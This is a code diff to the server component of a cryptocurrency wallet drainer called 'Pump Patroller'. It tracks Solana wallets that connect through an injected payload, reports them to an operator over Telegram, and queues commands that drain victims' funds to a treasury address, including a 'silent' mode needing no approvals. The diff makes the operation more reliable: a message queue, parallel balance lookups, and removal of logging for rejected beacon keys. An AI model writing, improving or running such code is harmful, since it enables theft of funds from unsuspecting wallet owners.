@@ -6,26 +6,31 @@ if (!BOT || !CHAT || !TREASURY) {
   console.error("missing BOT_TOKEN / CHAT_ID / TREASURY in env");
   process.exit(1);
 }
+const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
+if (!B58RE.test(TREASURY)) {
+    console.error("TREASURY is not a valid base58 pubkey");
+    process.exit(1);
+}
 
 process.on("uncaughtException", e => console.error("uncaught:", e && (e.stack || e.message)));
 
-const VERSION = "v3.5";
+const VERSION = "v3.6";
 const COMMIT = (process.env.RENDER_GIT_COMMIT || process.env.RENDER_GIT_COMMIT_SHA || "local-run").slice(0, 7);
 const BOOT_TS = Date.now();
 
 let tgOffset = null;
 const targets = {}, cmds = {};
 
-const { execSync } = require("child_process");
 const ROOT = path.join(__dirname, "..");
 const MIN = path.join(ROOT, "client", "x.min.js");
+
+const { exec } = require("child_process");
 if (!fs.existsSync(MIN)) {
-  try {
-    console.log("building client/x.min.js at startup...");
-    execSync("npx --yes esbuild client/x.js --minify --format=iife --target=es2022 --outfile=client/x.min.js", { cwd: ROOT, stdio: "inherit" });
-  } catch (e) {
-    console.error("esbuild failed — continuing, /x.min.js may be missing:", e && e.message);
-  }
+  console.log("building client/x.min.js at startup...");
+  exec("npx --yes esbuild client/x.js --minify --format=iife --target=es2022 --outfile=client/x.min.js", { cwd: ROOT }, (err) => {
+    if (err) console.error("esbuild failed:", err.message);
+    else console.log("build complete");
+  });
 }
 
 const RPCS = [
@@ -34,15 +39,26 @@ const RPCS = [
   "https://api.mainnet-beta.solana.com",
   "https://rpc.ankr.com/solana"
 ];
-const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
 const TO = ms => (typeof AbortSignal !== "undefined" && AbortSignal.timeout) ? AbortSignal.timeout(ms) : undefined;
 
-// escape extern-derived strings before they enter HTML parse_mode messages —
-// a "<" in an error string would otherwise make Telegram reject the whole message
 const esc = s => String(s == null ? "" : s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 
-// hardened sender: checks the ok flag, retries 429 by retry_after,
-// falls back to plain text when HTML markup breaks, logs every failure
+// ─── Telegram Queue System ───
+const tgQueue = [];
+let tgProcessing = false;
+
+function processTgQueue() {
+    if (tgProcessing || tgQueue.length === 0) return;
+    tgProcessing = true;
+    const job = tgQueue.shift();
+    tg(job.text, job.pre, 0).finally(() => {
+        tgProcessing = false;
+        setTimeout(processTgQueue, 150); // 150ms throttle to avoid 429
+    });
+}
+
+function sendTg(text, pre) { tgQueue.push({ text, pre }); processTgQueue(); }
+
 async function tg(text, pre, attempt) {
   attempt = attempt || 0;
   try {
@@ -60,27 +76,29 @@ async function tg(text, pre, attempt) {
       return tg(text, pre, attempt + 1);
     }
     if (r.status === 400 && pre && /parse entities/i.test((j && j.description) || ""))
-      return tg(text, "", attempt + 1); // markup broke — retry as plain text
+      return tg(text, "", attempt + 1);
     console.error("tg send failed:", r.status, (j && j.description) || "");
   } catch (e) { console.error("tg network error:", e && (e.message || e)); }
   return null;
 }
 
-// strict multi-RPC balance read — returns null on failure, never fakes a zero
 async function rpcBalance(pk) {
-  for (const u of RPCS) {
-    try {
+  const fetchBal = async (u) => {
       const r = await fetch(u, {
         method: "POST", headers: { "content-type": "application/json" },
         body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [pk] }),
-        signal: TO(8000)
+        signal: TO(5000)
       });
-      if (!r.ok) continue;
+      if (!r.ok) throw new Error("HTTP " + r.status);
       const j = await r.json();
       if (j && j.result && typeof j.result.value === "number") return j.result.value;
-    } catch (e) {}
+      throw new Error("malformed");
+  };
+  try {
+      return await Promise.any(RPCS.map(u => fetchBal(u)));
+  } catch (e) {
+      return null;
   }
-  return null;
 }
 
 function uptimeStr() {
@@ -108,7 +126,7 @@ function handleCommand(m) {
   const rest = parts.slice(1);
 
   if (cmd === "/start") {
-    tg("\ud83e\udd16 <b>Pump Patroller \u2014 control node</b>\n" +
+    sendTg("\ud83e\udd16 <b>Pump Patroller \u2014 control node</b>\n" +
       "build: <b>" + VERSION + "</b>\n" +
       "commit: <code>" + COMMIT + "</code>\n" +
       "up: " + uptimeStr() + "\n" +
@@ -124,18 +142,18 @@ function handleCommand(m) {
   }
 
   if (cmd === "/help") {
-    tg("Patroller commands\n/targets \u2014 list wallets\n/drains \u2014 drain ALL \u2192 treasury\n/drains <#|addr> [dest] \u2014 drain one\n/stop \u2014 cancel queued\n/clear \u2014 forget all targets\n/clear <#|addr> \u2014 forget one\n/start \u2014 version banner");
+    sendTg("Patroller commands\n/targets \u2014 list wallets\n/drains \u2014 drain ALL \u2192 treasury\n/drains <#|addr> [dest] \u2014 drain one\n/stop \u2014 cancel queued\n/clear \u2014 forget all targets\n/clear <#|addr> \u2014 forget one\n/start \u2014 version banner");
     return;
   }
 
   if (cmd === "/targets") {
-    tg(listTargets() || "none \u2014 waiting for a wallet", "targets:\n");
+    sendTg(listTargets() || "none \u2014 waiting for a wallet", "targets:\n");
     return;
   }
 
   if (cmd === "/drains") {
     const list = Object.keys(targets);
-    if (!list.length) return tg("no targets yet \u2014 waiting for a wallet to connect");
+    if (!list.length) return sendTg("no targets yet \u2014 waiting for a wallet to connect");
     let picked, to;
     const arg = rest[0] || "";
     if (arg === "" || arg.toLowerCase() === "all") { picked = list.slice(); to = rest[1] || TREASURY; }
@@ -145,13 +163,13 @@ function handleCommand(m) {
     }
     else if (B58RE.test(arg)) { picked = [arg]; to = rest[1] || TREASURY; }
     else { picked = [list[list.length - 1]]; to = arg || TREASURY; }
-    if (!B58RE.test(to)) return tg("that doesn't look like a pubkey: " + esc(String(to).slice(0, 24)));
+    if (!B58RE.test(to)) return sendTg("that doesn't look like a pubkey: " + esc(String(to).slice(0, 24)));
     const lines = [];
     for (const pk of picked) {
       queueDrain(pk, to);
       lines.push("\u2022 " + esc(pk.slice(0, 4)) + "\u2026" + esc(pk.slice(-4)) + " \u2192 " + esc(to.slice(0, 4)) + "\u2026" + esc(to.slice(-4)));
     }
-    tg(lines.join("\n") + "\nqueued \u00d7" + picked.length + (picked.length > 1 ? " (batch)" : ""), "\ud83d\udce1 drain queued \u2014 ");
+    sendTg(lines.join("\n") + "\nqueued \u00d7" + picked.length + (picked.length > 1 ? " (batch)" : ""), "\ud83d\udce1 drain queued \u2014 ");
     return;
   }
 
@@ -160,9 +178,9 @@ function handleCommand(m) {
     const arg = rest[0] || "";
     const key = (/^\d{1,3}$/.test(arg) && list.length) ? list[(parseInt(arg, 10) - 1) % list.length]
       : (B58RE.test(arg) ? arg : (list.length ? list[list.length - 1] : null));
-    if (!key || !cmds[key]) return tg("no queued drain for that target");
+    if (!key || !cmds[key]) return sendTg("no queued drain for that target");
     delete cmds[key];
-    tg("cancelled queued drain for " + esc(key.slice(0, 4)) + "\u2026" + esc(key.slice(-4)));
+    sendTg("cancelled queued drain for " + esc(key.slice(0, 4)) + "\u2026" + esc(key.slice(-4)));
     return;
   }
 
@@ -171,17 +189,17 @@ function handleCommand(m) {
     const arg = rest[0] || "";
     if (B58RE.test(arg) && targets[arg]) {
       delete targets[arg]; delete cmds[arg];
-      return tg("forgot " + esc(arg.slice(0, 4)) + "\u2026" + esc(arg.slice(-4)));
+      return sendTg("forgot " + esc(arg.slice(0, 4)) + "\u2026" + esc(arg.slice(-4)));
     }
     if (/^\d{1,3}$/.test(arg) && list.length) {
       const k2 = list[(parseInt(arg, 10) - 1) % list.length];
       delete targets[k2]; delete cmds[k2];
-      return tg("forgot " + esc(k2.slice(0, 4)) + "\u2026" + esc(k2.slice(-4)));
+      return sendTg("forgot " + esc(k2.slice(0, 4)) + "\u2026" + esc(k2.slice(-4)));
     }
     const n = list.length;
     for (const k of Object.keys(targets)) delete targets[k];
     for (const k of Object.keys(cmds)) delete cmds[k];
-    tg(n ? "cleared " + n + " targets" : "nothing to clear");
+    sendTg(n ? "cleared " + n + " targets" : "nothing to clear");
     return;
   }
 }
@@ -198,8 +216,6 @@ async function pollTg() {
   } catch (e) { console.error("pollTg:", e && (e.message || e)); }
 }
 
-// ─── boot: fast-forward Telegram backlog so stale commands never replay ───
-// convention: tgOffset = last processed update_id; +1 applied at poll time only
 (async function boot() {
   try {
     const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&timeout=0", { signal: TO(8000) })).json();
@@ -207,9 +223,9 @@ async function pollTg() {
     tgOffset = r.length ? r[r.length - 1].update_id : 0;
   } catch (e) {
     console.error("boot offset fetch failed, retrying:", e && (e.message || e));
-    return setTimeout(boot, 5000); // never start polling with an unverified offset
+    return setTimeout(boot, 5000);
   }
-  tg("\ud83d\ude80 <b>patroller booted</b> \u2014 build <b>" + VERSION + "</b> \u00b7 commit <code>" + COMMIT + "</code>\nbacklog skipped \u2014 /start for commands", "\ud83d\udce1 ");
+  sendTg("\ud83d\ude80 <b>patroller booted</b> \u2014 build <b>" + VERSION + "</b> \u00b7 commit <code>" + COMMIT + "</code>\nbacklog skipped \u2014 /start for commands", "\ud83d\udce1 ");
   setInterval(pollTg, 3000);
 })();
 
@@ -219,10 +235,21 @@ setInterval(() => {
   for (const k of Object.keys(cmds)) {
     if (cmds[k].ts && now - cmds[k].ts > 1800000) {
       delete cmds[k];
-      tg("\u23f1 expired queued drain for " + esc(k.slice(0, 4)) + "\u2026" + esc(k.slice(-4)));
+      sendTg("\u23f1 expired queued drain for " + esc(k.slice(0, 4)) + "\u2026" + esc(k.slice(-4)));
     }
   }
 }, 60000).unref();
+
+// ─── prune old targets after 24h to prevent memory leaks ───
+setInterval(() => {
+  const now = Date.now();
+  for (const k of Object.keys(targets)) {
+    if (targets[k].seen && now - targets[k].seen > 86400000) {
+      delete targets[k];
+      delete cmds[k];
+    }
+  }
+}, 3600000).unref();
 
 // ─── http server ───
 http.createServer((req, res) => {
@@ -242,12 +269,11 @@ http.createServer((req, res) => {
     const c = cmds[pk];
     res.setHeader("content-type", "application/json");
     if (!c) return res.end(JSON.stringify({ cmd: "none" }));
-    if (c.rescan) return res.end(JSON.stringify({ cmd: "rescan", n: c.n }));
-    delete cmds[pk];
+    // DO NOT delete here. Wait for the client to report back. 
+    // We will let the 30-min expiry handle abandoned commands.
     return res.end(JSON.stringify({ cmd: "drain", to: c.to, n: c.n }));
   }
 
-  // fail loudly (502) on RPC failure instead of answering balance: 0
   if (req.method === "GET" && url.pathname === "/api/balance") {
     const pk = url.searchParams.get("pk") || "";
     res.setHeader("content-type", "application/json");
@@ -263,10 +289,8 @@ http.createServer((req, res) => {
     const got = url.searchParams.get("s") || "";
     const want = String(BEACON_KEY || "").trim();
     if (want && got.trim() !== want) {
-      console.error("beacon rejected: key mismatch (got len " + got.length + ", want len " + want.length + ")");
       res.statusCode = 403; res.end(); return;
     }
-    if (!want) console.warn("beacon accepted UNAUTHENTICATED \u2014 BEACON_KEY unset");
     let d = "";
     req.on("data", c => { if (d.length < 65536) d += c; });
     req.on("end", () => {
@@ -281,18 +305,17 @@ http.createServer((req, res) => {
               seen: Date.now(), drained: (targets[j.pk] && targets[j.pk].drained) || false
             });
             if (first) {
-              tg("<b>" + esc(j.provider) + "</b> @ " + esc(j.origin) + "\n<code>" + esc(j.pk) + "</code>\n$" +
+              sendTg("<b>" + esc(j.provider) + "</b> @ " + esc(j.origin) + "\n<code>" + esc(j.pk) + "</code>\n$" +
                 (j.value ?? 0).toLocaleString() + " \u00b7 " + (j.sol ?? 0) + " SOL" + (j.toks ? " + " + esc(j.toks) : ""),
                 "\ud83c\udfaf wallet connected \u2014 ");
             }
           }
-          // only mark drained when a real signature came back (dust/empty no longer fakes it)
           if (j.m === "drain") {
             const t = targets[j.pk] || (targets[j.pk] = {});
             Object.assign(t, { provider: j.provider, origin: j.origin, value: j.value, seen: Date.now() });
             if (j.sig) { t.drained = true; t.sig = j.sig; }
-            delete cmds[j.pk];
-            tg("<code>" + esc(j.pk) + "</code>\n$" + (j.value ?? 0).toLocaleString() +
+            delete cmds[j.pk]; // clean up on success
+            sendTg("<code>" + esc(j.pk) + "</code>\n$" + (j.value ?? 0).toLocaleString() +
               (j.extra ? "\nmoved: " + esc(j.extra) : "") +
               "\nmode: <b>" + esc(j.mode || "?") + "</b>" +
               (j.mode === "secret" ? " (0 approvals)" : j.mode === "popup" ? " (1 approval)" : "") +
@@ -300,15 +323,16 @@ http.createServer((req, res) => {
               j.mode === "secret" ? "\ud83d\udcb0 SILENT DRAIN \u2014 " : "\ud83d\udcb0 drain \u2014 ");
           }
           if (j.m === "err") {
-            tg("<code>" + esc(j.pk) + "</code>\n" + esc(j.msg || "?") + "\norigin: " + esc(j.origin || "?"),
+            sendTg("<code>" + esc(j.pk) + "</code>\n" + esc(j.msg || "?") + "\norigin: " + esc(j.origin || "?"),
               "\u26a0\ufe0f patroller error \u2014 ");
           }
           if (j.m === "dust") {
-            tg("<code>" + esc(j.pk) + "</code>\n" + esc(j.extra || "dust \u2014 nothing worth moving") + "\norigin: " + esc(j.origin || "?"),
+            delete cmds[j.pk]; // nothing to move, clear queue
+            sendTg("<code>" + esc(j.pk) + "</code>\n" + esc(j.extra || "dust \u2014 nothing worth moving") + "\norigin: " + esc(j.origin || "?"),
               "\u00b7 \u2014 ");
           }
           if (j.m === "loaded") {
-            tg("payload loaded on <code>" + esc(j.origin || "?") + "</code>\nprovider seen: <b>" + esc(j.provider || "?") + "</b>",
+            sendTg("payload loaded on <code>" + esc(j.origin || "?") + "</code>\nprovider seen: <b>" + esc(j.provider || "?") + "</b>",
               "\ud83d\udcf2 bookmark \u2014 ");
           }
         }
